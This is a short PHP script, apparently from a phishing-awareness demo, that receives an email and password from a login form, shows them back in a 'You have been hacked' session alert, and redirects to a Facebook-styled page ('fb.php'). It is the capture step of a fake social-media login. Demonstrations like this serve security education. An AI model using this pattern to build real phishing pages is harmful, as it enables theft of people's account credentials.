<?php
session_start();
$e = $_POST['email'];
$p = $_POST['pass'];

$_SESSION['Alert'] = "You have been hacked.
Email: $e
Password: $p";

$_SESSION['Path'] = "../../fb.php";

header('Location: ../../fb.php');
exit;

?>